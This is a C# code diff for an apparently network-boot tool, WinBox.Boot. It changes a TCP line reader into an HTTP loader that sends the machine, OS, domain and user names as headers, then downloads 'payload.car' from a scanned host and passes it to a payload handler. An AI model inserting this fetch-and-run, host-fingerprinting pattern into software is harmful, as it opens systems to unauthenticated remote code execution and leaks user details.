@@ -24,6 +24,7 @@ namespace WinBox.Boot
 			scanned = new Dictionary<IPAddress, IPStatus?>();
 			TryFind();
 			waiter.WaitOne();
+			Console.WriteLine("Boot completed.");
 		}
 		
 		private static void TryFind()
@@ -73,20 +74,20 @@ namespace WinBox.Boot
 		private static void TryConnect(IPAddress addr)
 		{
 			const int port = 56000;
-			using (var client = new TcpClient())
+			using (var client = new WebClient())
 			{
-				var endpoint = new IPEndPoint(addr, port);
-				if (!client.TryConnect(endpoint))
+				client.Headers.Add("machine", Environment.MachineName);
+				client.Headers.Add("os", Environment.OSVersion+"");
+				client.Headers.Add("domain", Environment.UserDomainName);
+				client.Headers.Add("user", Environment.UserName);
+				const string file = "payload.car";
+				var httpUri = string.Format("http://{0}:{1}/winbox/{2}", addr, port, file);
+				var tempFile = Path.GetTempFileName();
+				if (!client.TryDownloadFile(httpUri, tempFile))
 					return;
-				Console.WriteLine("Connected to '{0}'!", endpoint);
-				using (var reader = new StreamReader(client.GetStream(), Encoding.UTF8))
-				{
-					while (client.Connected)
-					{
-						var line = reader.ReadLine();
-						Console.WriteLine(line);
-					}
-				}
+				Console.WriteLine("Downloaded '{0}' into '{1}'!", httpUri, tempFile);
+				Payload.HandlePayload(tempFile);
+				File.Delete(tempFile);
 				waiter.Set();
 			}
 		}
